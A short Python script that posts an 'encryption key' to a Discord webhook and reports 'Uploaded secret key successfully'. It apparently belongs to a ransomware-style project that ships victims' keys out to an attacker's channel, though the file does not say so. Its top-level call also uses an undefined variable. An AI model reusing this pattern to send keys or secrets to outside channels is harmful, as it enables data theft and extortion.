#!/usr/bin/env python3

# Created by Ranger (Dec 2024)
# Version 2.0.0

# Import necessary libraries
import requests
import json

# Function to send the secret key to Discord
def send_to_discord(key, webhook_url):
    # Convert bytes to string using decode
    key_str = key.decode()

    data = {}
    data["content"] = key_str
    result = requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})
    
    if result.status_code == 204:
        print()
        print("Uploaded secret key successfully")
    else:
        print(f"Failed to post message, got status code {result.status_code}")

# assuming 'key' is your encryption key, and 'webhook_url' is your Discord webhook URL
send_to_discord(key, "https://discord.com/api/webhooks/<your_webhook_id>")  # Replace <your_webhook_id> with the actual webhook ID
# Example usage:
# send_to_discord(b"your_encryption_key", "https://discord.com/api/webhooks/<your_webhook_id>")  # Replace <your_webhook_id> with the actual webhook ID


